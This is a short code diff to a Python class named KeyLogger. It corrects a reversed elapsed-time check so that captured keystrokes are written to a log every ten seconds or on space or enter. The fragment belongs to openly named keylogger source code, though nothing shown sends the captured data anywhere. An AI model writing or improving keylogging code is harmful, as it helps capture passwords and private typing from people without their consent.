@@ -34,7 +34,7 @@ class KeyLogger:
         Action taken on keyboard press
         """
         self.mem.append(str(key))
-        if self.stime - time.time() >= 10.0 or key == Key.space or key == Key.enter:
+        if time.time() - self.stime >= 10.0 or key == Key.space or key == Key.enter:
             # log the data, update time and flush buffer
             logging.info("".join(self.mem))
             self.mem.clear() 
